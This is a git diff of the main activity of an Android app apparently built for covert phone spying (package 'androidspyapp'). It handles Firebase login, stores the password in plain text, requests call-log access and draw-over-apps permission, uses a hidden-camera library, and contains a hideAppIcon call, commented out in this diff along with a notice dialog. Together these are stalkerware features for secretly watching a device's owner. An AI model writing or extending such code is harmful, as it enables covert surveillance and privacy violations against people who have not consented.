@@ -1,5 +1,6 @@
 package com.komnacki.androidspyapp
 
+import android.Manifest
 import android.app.AlarmManager
 import android.app.PendingIntent
 import android.content.*
@@ -10,8 +11,9 @@ import android.text.Editable
 import android.text.TextWatcher
 import android.view.View
 import android.widget.Toast
-import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import com.androidhiddencamera.HiddenCameraUtils
 import com.google.firebase.auth.FirebaseAuth
 import com.komnacki.androidspyapp.receivers.ServiceReceiver
@@ -27,6 +29,7 @@ class MainActivity : AppCompatActivity() {
         const val PREFS_IS_FIRST_LAUNCH: String = "IS_FIRST_LAUNCH"
         const val PREFS_USER_EMAIL: String = "PREFS_USER_EMAIL"
         const val PREFS_USER_PASSWORD: String = "PREFS_USER_PASSWORD"
+        const val PREFS_CALLS: String = "PREFS_CALLS"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -40,53 +43,59 @@ class MainActivity : AppCompatActivity() {
         val prefs = getSharedPreferences(SHARED_PREFERENCE_TAG, Context.MODE_PRIVATE)
         val isFirstRun = prefs.getBoolean(PREFS_IS_FIRST_LAUNCH, true)
 
-        if (isFirstRun) {
-            var isEmailValid = false
-            var isPasswordValid = false
-            val editor = prefs.edit()
+        var isEmailValid = false
+        var isPasswordValid = false
+        val editor = prefs.edit()
 
-            editor.putBoolean(PREFS_IS_FIRST_LAUNCH, false)
-            editor.apply()
+        editor.putBoolean(PREFS_IS_FIRST_LAUNCH, false)
+        editor.apply()
 
-            if (!HiddenCameraUtils.canOverDrawOtherApps(this)) {
-                HiddenCameraUtils.openDrawOverPermissionSetting(this);
+        if (!HiddenCameraUtils.canOverDrawOtherApps(this)) {
+            HiddenCameraUtils.openDrawOverPermissionSetting(this);
+        }
+
+        et_email.addTextChangedListener(object : TextWatcher {
+            override fun afterTextChanged(s: Editable?) {
+                onEmailChange(s)
             }
 
-            et_email.addTextChangedListener(object : TextWatcher {
-                override fun afterTextChanged(s: Editable?) {
-                    onEmailChange(s)
-                }
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) { /* no action */ }
 
-                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) { /* no action */ }
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) { /* no action */ }
 
-                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) { /* no action */ }
+            private fun onEmailChange(s: Editable?) {
+                isEmailValid = validateEmail(s.toString())
+                btn_connect.isEnabled = isEmailValid && isPasswordValid
+            }
+        })
+        et_password.addTextChangedListener(object : TextWatcher {
+            override fun afterTextChanged(s: Editable?) {
+                onPasswordChange(s)
+            }
 
-                private fun onEmailChange(s: Editable?) {
-                    isEmailValid = validateEmail(s.toString())
-                    btn_connect.isEnabled = isEmailValid && isPasswordValid
-                }
-            })
-            et_password.addTextChangedListener(object : TextWatcher {
-                override fun afterTextChanged(s: Editable?) {
-                    onPasswordChange(s)
-                }
+            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) { /* no action */ }
 
-                override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) { /* no action */ }
+            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) { /* no action */ }
 
-                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) { /* no action */ }
-
-                private fun onPasswordChange(s: Editable?) {
-                    isPasswordValid = !s.toString().isBlank()
-                    btn_connect.isEnabled = isEmailValid && isPasswordValid
-                }
-            })
-
-            btn_connect.setOnClickListener {
-                if (btn_connect.isEnabled) {
-                    onConnect(auth, prefs)
-                }
+            private fun onPasswordChange(s: Editable?) {
+                isPasswordValid = !s.toString().isBlank()
+                btn_connect.isEnabled = isEmailValid && isPasswordValid
+            }
+        })
+        btn_connect.setOnClickListener {
+            if (btn_connect.isEnabled) {
+                onConnect(auth, prefs)
             }
         }
+        if (!isFirstRun) {
+            et_email.setText(prefs.getString(PREFS_USER_EMAIL,""))
+            et_password.setText(prefs.getString(PREFS_USER_PASSWORD,""))
+        } else {
+            val editor = prefs.edit()
+            editor.putString(MainActivity.PREFS_CALLS, "20")
+            editor.apply()
+        }
+        checkPermissions()
     }
 
     private fun onConnect(auth: FirebaseAuth, prefs: SharedPreferences) {
@@ -101,19 +110,19 @@ class MainActivity : AppCompatActivity() {
             .addOnCompleteListener(this) { task ->
                 if (task.isSuccessful) {
                     saveUserCredential(prefs, email, password)
-                    hideAppIcon()
+                    //hideAppIcon()
 
-                    val dialog = AlertDialog.Builder(this)
-                        .setTitle(getString(R.string.dialog_title_attention))
-                        .setMessage(getString(R.string.dialog_description))
-                        .setPositiveButton(getString(R.string.dialog_accept)) { dialog: DialogInterface?, _: Int ->
+//                    val dialog = AlertDialog.Builder(this)
+//                        .setTitle(getString(R.string.dialog_title_attention))
+//                        .setMessage(getString(R.string.dialog_description))
+//                        .setPositiveButton(getString(R.string.dialog_accept)) { dialog: DialogInterface?, _: Int ->
                             run {
-                                dialog?.dismiss()
+                                //dialog?.dismiss()
                                 this.finish()
                             }
-                        }
+                        //}
                     setButtonVisibility(true)
-                    dialog.show()
+                    //dialog.show()
                 } else {
                     setButtonVisibility(true)
                     toastAutenticationFailed()
@@ -130,7 +139,7 @@ class MainActivity : AppCompatActivity() {
 
     private fun saveUserCredential(prefs: SharedPreferences, email: String, password: String) {
         val editor = prefs.edit()
-        editor.putString(PREFS_USER_EMAIL, email.replace(".", "_"))
+        editor.putString(PREFS_USER_EMAIL, email)
         editor.putString(PREFS_USER_PASSWORD, password)
         editor.apply()
     }
@@ -173,5 +182,12 @@ class MainActivity : AppCompatActivity() {
 
     fun validateEmail(input: String): Boolean {
         return input.matches(Regex(VALIDATE_EMAIL_REGEX_PATERN))
+    }
+
+    private fun checkPermissions() {
+        val NECESSARY_PERMISSIONS = arrayOf(Manifest.permission.READ_CALL_LOG)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, NECESSARY_PERMISSIONS, 101)
+        }
     }
 }
